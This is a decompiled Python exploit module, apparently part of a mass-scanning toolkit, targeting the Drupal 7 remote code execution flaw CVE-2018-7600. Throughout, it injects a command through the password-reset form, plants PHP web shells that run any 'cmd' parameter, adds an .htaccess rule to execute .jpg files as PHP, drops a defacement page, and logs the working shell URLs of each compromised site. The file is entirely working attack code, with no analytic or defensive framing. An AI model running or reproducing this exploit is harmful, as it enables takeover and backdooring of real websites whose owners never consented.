# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\CVE_2018_7600Drupalgeddon2.py
import requests
import re
from Exploits import printModule
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

def Exploit(site):
    try:
        payloadshell = "Vuln!!<?php {}({}['{}']);?>".format('system', '$_GET', 'cmd')
        PrivatePAyLoad = "echo 'Vuln!! patch it Now!' > vuln.htm; echo '" + payloadshell + "'> sites/default/files/vuln.php; echo '" + payloadshell + "'> vuln.php; cd sites/default/files/; echo 'AddType application/x-httpd-php .jpg' > .htaccess; echo '" + payloadshell + "'> up.php;"
        get_params = {'q': 'user/password','name[#post_render][]': 'passthru','name[#markup]': PrivatePAyLoad,
           'name[#type]': 'markup'}
        post_params = {'form_id': 'user_pass','_triggering_element_name': 'name'}
        r = requests.post('http://' + site, data=post_params, params=get_params, headers=Headers)
        m = re.search('<input type="hidden" name="form_build_id" value="([^"]+)" />', r.content)
        if m:
            found = m.group(1)
            get_params = {'q': 'file/ajax/name/#value/' + found}
            post_params = {'form_build_id': found}
            requests.post('http://' + site, data=post_params, params=get_params, headers=Headers)
            a = requests.get('http://' + site + '/sites/default/files/vuln.php', timeout=10, headers=Headers)
            if 'Vuln!!' in str(a.content):
                with open('result/Shell_results.txt', 'a') as writer:
                    writer.write(site + '/sites/default/files/vuln.php?cmd=id' + '\n')
                gg = requests.get('http://' + site + '/vuln.htm', timeout=10, headers=Headers)
                CheckUploader = requests.get('http://' + site + '/sites/default/files/up.php', timeout=10, headers=Headers)
                if 'Vuln!!' in str(CheckUploader.content):
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(site + '/sites/default/files/up.php?cmd=pwd' + '\n')
                if 'Vuln!!' in str(gg.content):
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/vuln.htm' + '\n')
                return printModule.returnYes(site, 'CVE-2018-7600', 'Drupal7 core Geddon2', 'Drupal')
            else:
                gg = requests.get('http://' + site + '/vuln.htm', timeout=10, headers=Headers)
                if 'Vuln!!' in str(gg.content):
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/vuln.htm' + '\n')
                    Checkshell = requests.get('http://' + site + '/vuln.php', timeout=10, headers=Headers)
                    if 'Vuln!!' in str(Checkshell.content):
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(site + '/vuln.php?cmd=id' + '\n')
                    return printModule.returnYes(site, 'CVE-2018-7600', 'Drupal7 core Geddon2', 'Drupal')
                return printModule.returnNo(site, 'CVE-2018-7600', 'Drupal7 core Geddon2', 'Drupal')

        else:
            return printModule.returnNo(site, 'CVE-2018-7600', 'Drupal7 core Geddon2', 'Drupal')
    except:
        return printModule.returnNo(site, 'CVE-2018-7600', 'Drupal7 core Geddon2', 'Drupal')